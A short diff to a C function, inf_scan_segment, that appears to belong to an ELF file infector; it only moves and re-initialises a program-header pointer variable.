@@ -54,8 +54,8 @@ elf_off_t inf_scan_segment(infect_t *inf) {
 
     elf_ehdr_t *ehdr = inf->elfo->ehdr;
     elf_phdr_t **phdrs = inf->elfo->phdrs;
-    elf_phdr_t *pdata = *phdrs;
     elf_phdr_t *pdata_after_check = NULL;
+    elf_phdr_t *pdata = NULL;
     elf_off_t len = 0;
     bool pass_check = false;
     short found = 0;
